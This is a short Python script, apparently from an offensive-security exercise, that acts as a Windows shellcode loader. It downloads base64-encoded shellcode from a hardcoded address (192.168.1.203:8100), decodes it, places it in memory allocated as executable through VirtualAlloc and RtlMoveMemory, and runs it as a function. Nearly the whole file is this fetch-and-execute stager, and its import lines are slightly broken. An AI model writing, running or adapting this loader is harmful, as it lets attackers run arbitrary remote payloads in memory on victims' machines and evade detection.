import urllib import requests

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response: #  Retrieve the base64-encoded shellcode from webserver.
        shellcode = base64.decodebytes(response.read()) # Decode base64 shellcode.
    return shellcode

def write_memory(buf): # Write the decoded shellcode into memory.
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t) # Two pointers and a size object.

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length) # Move the buffer into memory.
    return ptr # return pointer to the buffer.

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode) # Allocate a buffer to hold shellcode.

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None)) # Allows us to call call our shellcode as a normal python function.
    shell_func() # Call the function pointer to execute the shellcode.

if __name__ == '__main__':
    url = "http://192.168.1.203:8100/shellcode.bin" # Address to download shellcode.
    shellcode = get_code(url)
    run(shellcode)
